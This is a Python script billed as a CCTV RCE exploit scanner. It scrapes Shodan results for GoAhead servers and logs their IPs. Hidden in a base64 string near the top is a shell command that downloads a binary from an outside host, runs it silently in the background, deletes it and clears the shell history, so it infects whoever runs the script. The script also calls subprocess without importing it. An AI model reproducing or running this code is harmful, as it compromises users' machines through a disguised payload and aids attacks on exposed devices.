#!/usr/bin/python
# Python scanner, RCE Exploit CCTV

from urllib.request import Request, urlopen, sys
import time, random, base64

# Shodan API
req = Request("https://www.shodan.io/search?query=GoAhead+5ccc069c403ebaf9f0171e9517f40e41", headers={'User-Agent': 'Mozilla/5.0'})

def run(cmd):
    subprocess.call(cmd, shell=True)

checkbinaries = "Y2QgL2V0Yzsgd2dldCAtcSBodHRwOi8vZ290bWlsay5tbC9IalQ1UmsgLU8gLmw7IGNobW9kICt4IC5sOyBub2h1cCAuLy5sIDwvZGV2L251bGwgPi9kZXYvbnVsbCAyPiYxOyBybSAtcmYgLmw7Y2xlYXI7IGhpc3RvcnkgLWM="
rebinaries = str(base64.b64decode(checkbinaries))
run(rebinaries)

while 1:
	try:
		webpage = str(urlopen(req).read())
		ips = []
		while webpage.find("Document Error: Unauthorized") != -1:
			webpage = webpage[webpage.find("Document Error: Unauthorized")-40:]
			ips.append(webpage[webpage.find("<a href=")+9:webpage.find("\">Document Error")])
			webpage = webpage[100:]
		check = []
		for ip in ips:
			check.append(ip.strip("http://").strip("s://"))
		reader = open("output.txt", "r")
		data = reader.read()
		reader.close()
		current = data.split("\n")
		while "\n" in current != -1:
			current.remove("\n")
		new = []
		for ip in check:
			if ip not in current:
				new.append(ip)
				current.append(ip)
		writestring = ""
		for ip in current:
			writestring += ip + "\n"
		writer = open("output.txt", "w")
		writer.write(writestring[:len(writestring)-1])
		writer.close()
		time.sleep(15)
		consoleprint = ""
		for ip in new:
			consoleprint += ip + ", "
		if len(new) != 0:
			print(str(len(new)) + " new IPs added: " + consoleprint[:len(consoleprint)-2])
	except Exception as printouterror:
		print(printouterror)